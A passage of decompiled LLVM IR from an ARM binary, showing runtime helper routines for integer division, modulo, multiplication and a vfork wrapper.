  %v5_f2e0 = phi i32 [ %v1_f2d0, %bb74 ], [ %v3_f2dc, %.thread67 ], [ %v1_f324.v6_f324.v6_f32c.v6_f334, %dec_label_pc_f348 ], [ 0, %bb84 ], [ %v1_f37c, %dec_label_pc_f378 ], [ %v2_f378, %bb89 ]
  ret i32 %v5_f2e0

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_f2e8.preheader
  %v0_f2fc.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_f2e8.preheader ], [ %v4_f2f0, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_f2e8.preheader ], [ %v2_f2f411, %.thread1.thread9 ]
  br label %dec_label_pc_f2fcthread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_f2e8.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_f2f411, %.thread1.thread9 ], [ 0, %dec_label_pc_f2e8.preheader ]
  %v0_f2fc.pr33100 = phi i32 [ %v4_f2f0, %.thread1.thread9 ], [ %arg2, %dec_label_pc_f2e8.preheader ]
  %v4_f2ec = icmp ult i32 %v0_f2fc.pr33100, %v1_f2d0
  br i1 %v4_f2ec, label %bb78, label %dec_label_pc_f2fcthread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_f2f0 = and i32 %v0_f2fc.pr33100, 268435456
  %v3_f2f0 = icmp eq i32 %v2_f2f0, 0
  %v4_f2f0 = mul i32 %v0_f2fc.pr33100, 16
  br i1 %v3_f2f0, label %.thread1.thread9, label %dec_label_pc_f2fc.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_f2f411 = add i32 %storemerge101, 4
  %v2_f2e8 = icmp ugt i32 %v4_f2f0, 268435455
  br i1 %v2_f2e8, label %.thread, label %bb77

dec_label_pc_f2fcthread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_f2fcthread-pre-split.loopexit

dec_label_pc_f2fcthread-pre-split.loopexit:       ; preds = %dec_label_pc_f2fcthread-pre-split.loopexit.loopexit, %.thread
  %v0_f2fc.pr3398 = phi i32 [ %v0_f2fc.pr33.lcssa, %.thread ], [ %v0_f2fc.pr33100, %dec_label_pc_f2fcthread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_f2fcthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_f2fcthread-pre-split

dec_label_pc_f2fcthread-pre-split:                ; preds = %.thread4, %dec_label_pc_f2fcthread-pre-split.loopexit
  %v1_f30839 = phi i32 [ %storemerge95, %dec_label_pc_f2fcthread-pre-split.loopexit ], [ %v2_f308, %.thread4 ]
  %v0_f2fc.pr = phi i32 [ %v0_f2fc.pr3398, %dec_label_pc_f2fcthread-pre-split.loopexit ], [ %v3_f304, %.thread4 ]
  br label %dec_label_pc_f2fc

dec_label_pc_f2fc.loopexit:                       ; preds = %bb78
  br label %dec_label_pc_f2fc

dec_label_pc_f2fc:                                ; preds = %dec_label_pc_f2fc.loopexit, %dec_label_pc_f2fcthread-pre-split
  %v0_f310.pr = phi i32 [ %v1_f30839, %dec_label_pc_f2fcthread-pre-split ], [ %storemerge101, %dec_label_pc_f2fc.loopexit ]
  %v1_f304 = phi i32 [ %v0_f2fc.pr, %dec_label_pc_f2fcthread-pre-split ], [ %v4_f2f0, %dec_label_pc_f2fc.loopexit ]
  %v2_f2fc = icmp slt i32 %v1_f304, 0
  br i1 %v2_f2fc, label %dec_label_pc_f310, label %bb79

bb79:                                             ; preds = %dec_label_pc_f2fc
  %v4_f300 = icmp ult i32 %v1_f304, %v1_f2d0
  br i1 %v4_f300, label %.thread4, label %dec_label_pc_f310

.thread4:                                         ; preds = %bb79
  %v3_f304 = mul i32 %v1_f304, 2
  %v2_f308 = add i32 %v0_f310.pr, 1
  br label %dec_label_pc_f2fcthread-pre-split

dec_label_pc_f310:                                ; preds = %bb79, %dec_label_pc_f2fc
  %v2_f310 = add i32 %v0_f310.pr, -3
  %v5_f314 = icmp slt i32 %v0_f310.pr, 3
  br i1 %v5_f314, label %dec_label_pc_f354, label %dec_label_pc_f318

dec_label_pc_f318:                                ; preds = %dec_label_pc_f310, %bb83
  %v6_f340 = phi i32 [ %v0_f348, %bb83 ], [ %v2_f310, %dec_label_pc_f310 ]
  %v1_f31c = phi i32 [ %v1_f324.v6_f324.v6_f32c.v6_f334, %bb83 ], [ %v1_f2d0, %dec_label_pc_f310 ]
  %v3_f33c12 = phi i32 [ %v3_f33c, %bb83 ], [ %v1_f304, %dec_label_pc_f310 ]
  %v3_f318 = icmp ult i32 %v1_f31c, %v3_f33c12
  %v3_f31c = select i1 %v3_f318, i32 0, i32 %v3_f33c12
  %v1_f324 = sub i32 %v1_f31c, %v3_f31c
  %v4_f320 = udiv i32 %v3_f33c12, 2
  %v6_f320 = icmp ult i32 %v1_f324, %v4_f320
  %v6_f324 = select i1 %v6_f320, i32 0, i32 %v4_f320
  %v1_f324.v6_f324 = sub i32 %v1_f324, %v6_f324
  %.demorgan = and i1 %v3_f318, %v6_f320
  %v4_f328 = udiv i32 %v3_f33c12, 4
  %v6_f328 = icmp ult i32 %v1_f324.v6_f324, %v4_f328
  %v6_f32c = select i1 %v6_f328, i32 0, i32 %v4_f328
  %v1_f324.v6_f324.v6_f32c = sub i32 %v1_f324.v6_f324, %v6_f32c
  %.demorgan71 = and i1 %.demorgan, %v6_f328
  %v4_f330 = udiv i32 %v3_f33c12, 8
  %v6_f330 = icmp ult i32 %v1_f324.v6_f324.v6_f32c, %v4_f330
  %v6_f334 = select i1 %v6_f330, i32 0, i32 %v4_f330
  %v1_f324.v6_f324.v6_f32c.v6_f334 = sub i32 %v1_f324.v6_f324.v6_f32c, %v6_f334
  %.demorgan72 = and i1 %.demorgan71, %v6_f330
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_f318
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_f318, %bb80
  %v2_f338 = add i32 %v1_f324.v6_f324.v6_f32c.v6_f334, -1
  %v4_f338 = sub i32 0, %v1_f324.v6_f324.v6_f32c.v6_f334
  %v5_f338 = and i32 %v1_f324.v6_f324.v6_f32c.v6_f334, %v4_f338
  %v3_f33c = udiv i32 %v3_f33c12, 16
  %v5_f340 = icmp slt i32 %v1_f324.v6_f324.v6_f32c.v6_f334, 1
  br i1 %v5_f340, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_f340 = add i32 %v6_f340, -4
  %v9_f340 = sub i32 3, %v6_f340
  %v10_f340 = and i32 %v9_f340, %v6_f340
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_f348 = phi i32 [ %v6_f340, %bb81 ], [ %v7_f340, %bb82 ]
  %v0_f34415.in = phi i32 [ %v2_f338, %bb81 ], [ %v7_f340, %bb82 ]
  %v1_f34414.in = phi i32 [ %v5_f338, %bb81 ], [ %v10_f340, %bb82 ]
  %v1_f34414 = icmp slt i32 %v1_f34414.in, 0
  %v0_f34415 = icmp slt i32 %v0_f34415.in, 0
  %v2_f344 = xor i1 %v0_f34415, %v1_f34414
  br i1 %v2_f344, label %dec_label_pc_f348, label %dec_label_pc_f318

dec_label_pc_f348:                                ; preds = %bb83
  %v1_f348 = urem i32 %v0_f348, 4
  %v2_f348 = icmp eq i32 %v1_f348, 0
  br i1 %v2_f348, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_f348
  %v3_f34c = icmp eq i32 %v1_f324.v6_f324.v6_f32c.v6_f334, 0
  br i1 %v3_f34c, label %bb76, label %dec_label_pc_f354

dec_label_pc_f354:                                ; preds = %dec_label_pc_f310, %bb84
  %v0_f368 = phi i32 [ %v1_f304, %dec_label_pc_f310 ], [ %v3_f33c, %bb84 ]
  %v1_f364 = phi i32 [ %v1_f2d0, %dec_label_pc_f310 ], [ %v1_f324.v6_f324.v6_f32c.v6_f334, %bb84 ]
  %v0_f354 = phi i32 [ %v2_f310, %dec_label_pc_f310 ], [ %v0_f348, %bb84 ]
  %v5_f358 = icmp slt i32 %v0_f354, -2
  br i1 %v5_f358, label %dec_label_pc_f378, label %dec_label_pc_f35c

dec_label_pc_f35c:                                ; preds = %dec_label_pc_f354
  %v8_f354 = icmp eq i32 %v0_f354, -2
  br i1 %v8_f354, label %dec_label_pc_f36c, label %dec_label_pc_f360

dec_label_pc_f360:                                ; preds = %dec_label_pc_f35c
  %v3_f360 = icmp ult i32 %v1_f364, %v0_f368
  br i1 %v3_f360, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_f360
  %v2_f360 = sub i32 %v1_f364, %v0_f368
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_f360, %bb85
  %v0_f36c52 = phi i32 [ %v1_f364, %dec_label_pc_f360 ], [ %v2_f360, %bb85 ]
  %v3_f368 = udiv i32 %v0_f368, 2
  br label %dec_label_pc_f36c

dec_label_pc_f36c:                                ; preds = %dec_label_pc_f35c, %bb86
  %v0_f374 = phi i32 [ %v0_f368, %dec_label_pc_f35c ], [ %v3_f368, %bb86 ]
  %v1_f370 = phi i32 [ %v1_f364, %dec_label_pc_f35c ], [ %v0_f36c52, %bb86 ]
  %v3_f36c = icmp ult i32 %v1_f370, %v0_f374
  br i1 %v3_f36c, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_f36c
  %v2_f36c = sub i32 %v1_f370, %v0_f374
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_f36c, %bb87
  %v0_f37855 = phi i32 [ %v1_f370, %dec_label_pc_f36c ], [ %v2_f36c, %bb87 ]
  %v3_f374 = udiv i32 %v0_f374, 2
  br label %dec_label_pc_f378

dec_label_pc_f378:                                ; preds = %dec_label_pc_f354, %bb88
  %v2_f37c = phi i32 [ %v0_f368, %dec_label_pc_f354 ], [ %v3_f374, %bb88 ]
  %v1_f37c = phi i32 [ %v1_f364, %dec_label_pc_f354 ], [ %v0_f37855, %bb88 ]
  %v3_f378 = icmp ult i32 %v1_f37c, %v2_f37c
  br i1 %v3_f378, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_f378
  %v2_f378 = sub i32 %v1_f37c, %v2_f37c
  br label %bb76

dec_label_pc_f384:                                ; preds = %entry
  %v0_f384 = load i32, i32* @lr, align 4
  %v0_f388 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_f384)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_f37c, { 1, 2, 0 }
  uselistorder i32 %v0_f368, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_f348, { 1, 0, 2 }
  uselistorder i32 %v7_f340, { 1, 0 }
  uselistorder i32 %v3_f33c, { 1, 0 }
  uselistorder i32 %v1_f324.v6_f324.v6_f32c.v6_f334, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_f330, { 1, 0 }
  uselistorder i32 %v4_f328, { 1, 0 }
  uselistorder i32 %v4_f320, { 1, 0 }
  uselistorder i32 %v6_f340, { 3, 0, 2, 1 }
  uselistorder i32 %v2_f310, { 1, 0 }
  uselistorder i32 %v1_f304, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_f2f0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_f2fc.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f2d0, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_f378, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_f36c, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %dec_label_pc_f354, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_f318, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_f394 = icmp eq i32 %arg2, 0
  br i1 %v2_f394, label %dec_label_pc_f468, label %dec_label_pc_f39c

dec_label_pc_f39c:                                ; preds = %entry
  %v1_f394 = icmp slt i32 %arg2, 0
  br i1 %v1_f394, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_f39c
  %v2_f39c = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_f39c, %bb
  %v4_f3b4 = phi i32 [ %arg2, %dec_label_pc_f39c ], [ %v2_f39c, %bb ]
  %v0_f3a0 = load i32, i32* @r0, align 4
  %v1_f3a0 = icmp slt i32 %v0_f3a0, 0
  br i1 %v1_f3a0, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_f3a4 = sub i32 0, %v0_f3a0
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_f3ac = phi i32 [ %v0_f3a0, %bb79 ], [ %v2_f3a4, %bb80 ]
  %v1_f3a8 = add i32 %v4_f3b4, -1
  %v7_f3a8 = icmp eq i32 %v4_f3b4, 1
  br i1 %v7_f3a8, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_f3ac = icmp eq i32 %v1_f3ac, %v4_f3b4
  br i1 %v10_f3ac, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_f3ac = icmp ult i32 %v1_f3ac, %v4_f3b4
  br i1 %v4_f3ac, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_f3b4 = and i32 %v1_f3a8, %v4_f3b4
  %v8_f3b4 = icmp eq i32 %v6_f3b4, 0
  br i1 %v8_f3b4, label %.thread72, label %dec_label_pc_f3c4.preheader

dec_label_pc_f3c4.preheader:                      ; preds = %bb84
  %v2_f3c4109 = icmp ugt i32 %v4_f3b4, 268435455
  br i1 %v2_f3c4109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_f3b864 = phi i32 [ %v1_f3ac, %bb84 ], [ 0, %.thread70 ]
  %v3_f3b8 = and i32 %v1_f3b864, %v1_f3a8
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_f3c4.preheader
  %v0_f3d8.pr35.lcssa = phi i32 [ %v4_f3b4, %dec_label_pc_f3c4.preheader ], [ %v4_f3cc, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_f3c4.preheader ], [ %v2_f3d09, %.thread2.thread7 ]
  br label %dec_label_pc_f3d8thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_f3c4.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_f3d09, %.thread2.thread7 ], [ 0, %dec_label_pc_f3c4.preheader ]
  %v0_f3d8.pr35110 = phi i32 [ %v4_f3cc, %.thread2.thread7 ], [ %v4_f3b4, %dec_label_pc_f3c4.preheader ]
  %v4_f3c8 = icmp ult i32 %v0_f3d8.pr35110, %v1_f3ac
  br i1 %v4_f3c8, label %bb86, label %dec_label_pc_f3d8thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_f3cc = and i32 %v0_f3d8.pr35110, 268435456
  %v3_f3cc = icmp eq i32 %v2_f3cc, 0
  %v4_f3cc = mul i32 %v0_f3d8.pr35110, 16
  br i1 %v3_f3cc, label %.thread2.thread7, label %dec_label_pc_f3d8.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_f3d09 = add i32 %storemerge111, 4
  %v2_f3c4 = icmp ugt i32 %v4_f3cc, 268435455
  br i1 %v2_f3c4, label %.thread1, label %bb85

dec_label_pc_f3d8thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_f3d8thread-pre-split.loopexit

dec_label_pc_f3d8thread-pre-split.loopexit:       ; preds = %dec_label_pc_f3d8thread-pre-split.loopexit.loopexit, %.thread1
  %v0_f3d8.pr35108 = phi i32 [ %v0_f3d8.pr35.lcssa, %.thread1 ], [ %v0_f3d8.pr35110, %dec_label_pc_f3d8thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_f3d8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_f3d8thread-pre-split

dec_label_pc_f3d8thread-pre-split:                ; preds = %.thread4, %dec_label_pc_f3d8thread-pre-split.loopexit
  %v1_f3e441 = phi i32 [ %storemerge105, %dec_label_pc_f3d8thread-pre-split.loopexit ], [ %v2_f3e4, %.thread4 ]
  %v2_f3dc36 = phi i32 [ %v1_f3ac, %dec_label_pc_f3d8thread-pre-split.loopexit ], [ %v2_f3dc, %.thread4 ]
  %v0_f3d8.pr = phi i32 [ %v0_f3d8.pr35108, %dec_label_pc_f3d8thread-pre-split.loopexit ], [ %v3_f3e0, %.thread4 ]
  br label %dec_label_pc_f3d8

dec_label_pc_f3d8.loopexit:                       ; preds = %bb86
  br label %dec_label_pc_f3d8

dec_label_pc_f3d8:                                ; preds = %dec_label_pc_f3d8.loopexit, %dec_label_pc_f3d8thread-pre-split
  %v0_f3ec.pr = phi i32 [ %v1_f3e441, %dec_label_pc_f3d8thread-pre-split ], [ %storemerge111, %dec_label_pc_f3d8.loopexit ]
  %v2_f3dc = phi i32 [ %v2_f3dc36, %dec_label_pc_f3d8thread-pre-split ], [ %v1_f3ac, %dec_label_pc_f3d8.loopexit ]
  %v1_f3e0 = phi i32 [ %v0_f3d8.pr, %dec_label_pc_f3d8thread-pre-split ], [ %v4_f3cc, %dec_label_pc_f3d8.loopexit ]
  %v2_f3d8 = icmp slt i32 %v1_f3e0, 0
  br i1 %v2_f3d8, label %dec_label_pc_f3ec, label %bb87

bb87:                                             ; preds = %dec_label_pc_f3d8
  %v4_f3dc = icmp ult i32 %v1_f3e0, %v2_f3dc
  br i1 %v4_f3dc, label %.thread4, label %dec_label_pc_f3ec

.thread4:                                         ; preds = %bb87
  %v3_f3e0 = mul i32 %v1_f3e0, 2
  %v2_f3e4 = add i32 %v0_f3ec.pr, 1
  br label %dec_label_pc_f3d8thread-pre-split

dec_label_pc_f3ec:                                ; preds = %bb87, %dec_label_pc_f3d8
  %v2_f3ec = add i32 %v0_f3ec.pr, -3
  %v5_f3f0 = icmp slt i32 %v0_f3ec.pr, 3
  br i1 %v5_f3f0, label %dec_label_pc_f430, label %dec_label_pc_f3f4

dec_label_pc_f3f4:                                ; preds = %dec_label_pc_f3ec, %bb91
  %v6_f41c = phi i32 [ %v0_f424, %bb91 ], [ %v2_f3ec, %dec_label_pc_f3ec ]
  %v1_f3f8 = phi i32 [ %v1_f400.v6_f400.v6_f408.v6_f410, %bb91 ], [ %v2_f3dc, %dec_label_pc_f3ec ]
  %v3_f41810 = phi i32 [ %v3_f418, %bb91 ], [ %v1_f3e0, %dec_label_pc_f3ec ]
  %v3_f3f4 = icmp ult i32 %v1_f3f8, %v3_f41810
  %v3_f3f8 = select i1 %v3_f3f4, i32 0, i32 %v3_f41810
  %v1_f400 = sub i32 %v1_f3f8, %v3_f3f8
  %v4_f3fc = udiv i32 %v3_f41810, 2
  %v6_f3fc = icmp ult i32 %v1_f400, %v4_f3fc
  %v6_f400 = select i1 %v6_f3fc, i32 0, i32 %v4_f3fc
  %v1_f400.v6_f400 = sub i32 %v1_f400, %v6_f400
  %.demorgan = and i1 %v3_f3f4, %v6_f3fc
  %v4_f404 = udiv i32 %v3_f41810, 4
  %v6_f404 = icmp ult i32 %v1_f400.v6_f400, %v4_f404
  %v6_f408 = select i1 %v6_f404, i32 0, i32 %v4_f404
  %v1_f400.v6_f400.v6_f408 = sub i32 %v1_f400.v6_f400, %v6_f408
  %.demorgan76 = and i1 %.demorgan, %v6_f404
  %v4_f40c = udiv i32 %v3_f41810, 8
  %v6_f40c = icmp ult i32 %v1_f400.v6_f400.v6_f408, %v4_f40c
  %v6_f410 = select i1 %v6_f40c, i32 0, i32 %v4_f40c
  %v1_f400.v6_f400.v6_f408.v6_f410 = sub i32 %v1_f400.v6_f400.v6_f408, %v6_f410
  %.demorgan77 = and i1 %.demorgan76, %v6_f40c
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_f3f4
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_f3f4, %bb88
  %v2_f414 = add i32 %v1_f400.v6_f400.v6_f408.v6_f410, -1
  %v4_f414 = sub i32 0, %v1_f400.v6_f400.v6_f408.v6_f410
  %v5_f414 = and i32 %v1_f400.v6_f400.v6_f408.v6_f410, %v4_f414
  %v3_f418 = udiv i32 %v3_f41810, 16
  %v5_f41c = icmp slt i32 %v1_f400.v6_f400.v6_f408.v6_f410, 1
  br i1 %v5_f41c, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_f41c = add i32 %v6_f41c, -4
  %v9_f41c = sub i32 3, %v6_f41c
  %v10_f41c = and i32 %v9_f41c, %v6_f41c
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_f424 = phi i32 [ %v6_f41c, %bb89 ], [ %v7_f41c, %bb90 ]
  %v0_f42013.in = phi i32 [ %v2_f414, %bb89 ], [ %v7_f41c, %bb90 ]
  %v1_f42012.in = phi i32 [ %v5_f414, %bb89 ], [ %v10_f41c, %bb90 ]
  %v1_f42012 = icmp slt i32 %v1_f42012.in, 0
  %v0_f42013 = icmp slt i32 %v0_f42013.in, 0
  %v2_f420 = xor i1 %v0_f42013, %v1_f42012
  br i1 %v2_f420, label %dec_label_pc_f424, label %dec_label_pc_f3f4

dec_label_pc_f424:                                ; preds = %bb91
  %v1_f424 = urem i32 %v0_f424, 4
  %v2_f424 = icmp eq i32 %v1_f424, 0
  br i1 %v2_f424, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_f424
  %v3_f428 = icmp eq i32 %v1_f400.v6_f400.v6_f408.v6_f410, 0
  br i1 %v3_f428, label %.thread6, label %dec_label_pc_f430

dec_label_pc_f430:                                ; preds = %bb92, %dec_label_pc_f3ec
  %v0_f444 = phi i32 [ %v3_f418, %bb92 ], [ %v1_f3e0, %dec_label_pc_f3ec ]
  %v1_f440 = phi i32 [ %v1_f400.v6_f400.v6_f408.v6_f410, %bb92 ], [ %v2_f3dc, %dec_label_pc_f3ec ]
  %v0_f430 = phi i32 [ %v0_f424, %bb92 ], [ %v2_f3ec, %dec_label_pc_f3ec ]
  %v5_f434 = icmp slt i32 %v0_f430, -2
  br i1 %v5_f434, label %dec_label_pc_f454, label %dec_label_pc_f438

dec_label_pc_f438:                                ; preds = %dec_label_pc_f430
  %v8_f430 = icmp eq i32 %v0_f430, -2
  br i1 %v8_f430, label %dec_label_pc_f448, label %dec_label_pc_f43c

dec_label_pc_f43c:                                ; preds = %dec_label_pc_f438
  %v3_f43c = icmp ult i32 %v1_f440, %v0_f444
  br i1 %v3_f43c, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_f43c
  %v2_f43c = sub i32 %v1_f440, %v0_f444
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_f43c, %bb93
  %v0_f44854 = phi i32 [ %v1_f440, %dec_label_pc_f43c ], [ %v2_f43c, %bb93 ]
  %v3_f444 = udiv i32 %v0_f444, 2
  br label %dec_label_pc_f448

dec_label_pc_f448:                                ; preds = %dec_label_pc_f438, %bb94
  %v0_f450 = phi i32 [ %v0_f444, %dec_label_pc_f438 ], [ %v3_f444, %bb94 ]
  %v1_f44c = phi i32 [ %v1_f440, %dec_label_pc_f438 ], [ %v0_f44854, %bb94 ]
  %v3_f448 = icmp ult i32 %v1_f44c, %v0_f450
  br i1 %v3_f448, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_f448
  %v2_f448 = sub i32 %v1_f44c, %v0_f450
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_f448, %bb95
  %v0_f45457 = phi i32 [ %v1_f44c, %dec_label_pc_f448 ], [ %v2_f448, %bb95 ]
  %v3_f450 = udiv i32 %v0_f450, 2
  br label %dec_label_pc_f454

dec_label_pc_f454:                                ; preds = %dec_label_pc_f430, %bb96
  %v2_f458 = phi i32 [ %v0_f444, %dec_label_pc_f430 ], [ %v3_f450, %bb96 ]
  %v1_f458 = phi i32 [ %v1_f440, %dec_label_pc_f430 ], [ %v0_f45457, %bb96 ]
  %v3_f454 = icmp ult i32 %v1_f458, %v2_f458
  br i1 %v3_f454, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_f454
  %v2_f454 = sub i32 %v1_f458, %v2_f458
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_f454, %bb83, %.thread72, %dec_label_pc_f424, %bb92, %bb97
  %v1_f460 = phi i32 [ %v1_f400.v6_f400.v6_f408.v6_f410, %dec_label_pc_f424 ], [ 0, %bb92 ], [ %v1_f458, %dec_label_pc_f454 ], [ %v2_f454, %bb97 ], [ %v3_f3b8, %.thread72 ], [ %v1_f3ac, %bb83 ]
  br i1 %v1_f3a0, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_f460 = sub i32 0, %v1_f460
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_f464 = phi i32 [ %v1_f460, %.thread6 ], [ %v2_f460, %bb98 ]
  ret i32 %v1_f464

dec_label_pc_f468:                                ; preds = %entry
  %v0_f468 = load i32, i32* @lr, align 4
  %v0_f46c = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_f468)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_f444, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_f424, { 1, 0, 2 }
  uselistorder i32 %v7_f41c, { 1, 0 }
  uselistorder i32 %v3_f418, { 1, 0 }
  uselistorder i32 %v1_f400.v6_f400.v6_f408.v6_f410, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_f40c, { 1, 0 }
  uselistorder i32 %v4_f404, { 1, 0 }
  uselistorder i32 %v4_f3fc, { 1, 0 }
  uselistorder i32 %v6_f41c, { 3, 0, 2, 1 }
  uselistorder i32 %v2_f3ec, { 1, 0 }
  uselistorder i32 %v1_f3e0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_f3dc, { 1, 0, 3, 2 }
  uselistorder i32 %v4_f3cc, { 1, 0, 3, 2 }
  uselistorder i32 %v0_f3d8.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f3ac, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_f3b4, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_f454, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_f448, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_f3f4, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_f478 = load i32, i32* @r0, align 4
  ret i32 %v1_f478
}

define i32 @__muldi3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_f488 = udiv i32 %arg1, 65536
  %v3_f48c = udiv i32 %arg3, 65536
  %tmp = mul i32 %v3_f488, -65536
  %v5_f490 = add i32 %tmp, -1
  %v6_f490 = and i32 %v5_f490, %arg1
  %tmp10 = mul i32 %v3_f48c, -65536
  %v5_f494 = add i32 %tmp10, -1
  %v6_f494 = and i32 %v5_f494, %arg3
  %v2_f498 = mul i32 %v6_f494, %v6_f490
  %v2_f49c = mul i32 %v6_f494, %v3_f488
  %v2_f4a0 = mul i32 %v6_f490, %v3_f48c
  %v2_f4a8 = add i32 %v2_f49c, %v2_f4a0
  %v3_f4a8 = icmp ult i32 %v2_f4a8, %v2_f49c
  br i1 %v3_f4a8, label %bb, label %bb9

bb:                                               ; preds = %entry
  br label %bb9

bb9:                                              ; preds = %entry, %bb
  %v4_f4b0 = mul i32 %v2_f4a8, 65536
  %v5_f4b0 = add i32 %v4_f4b0, %v2_f498
  ret i32 %v5_f4b0

; uselistorder directives
  uselistorder i32 %v2_f49c, { 1, 0 }
  uselistorder i32 %v6_f490, { 1, 0 }
  uselistorder i32 %v3_f48c, { 1, 0 }
  uselistorder i32 %v3_f488, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_f4d0 = call i32 @vfork()
  store i32 %v0_f4d0, i32* @r0, align 4
  %v2_f4d4 = icmp ugt i32 %v0_f4d0, -4097
  br i1 %v2_f4d4, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_f4e8, %entry
  %merge = phi i32 [ %v0_f4d0, %entry ], [ %v0_f4e8, %dec_label_pc_f4e8 ]
  ret i32 %merge

bb1:                                              ; preds = %entry
  %v4_f4e0 = icmp eq i32 %v0_f4d0, -38
  br i1 %v4_f4e0, label %dec_label_pc_f4e8, label %bb2

dec_label_pc_f4e8:                                ; preds = %bb1
  %v0_f4e8 = call i32 @fork()
  store i32 %v0_f4e8, i32* @r0, align 4
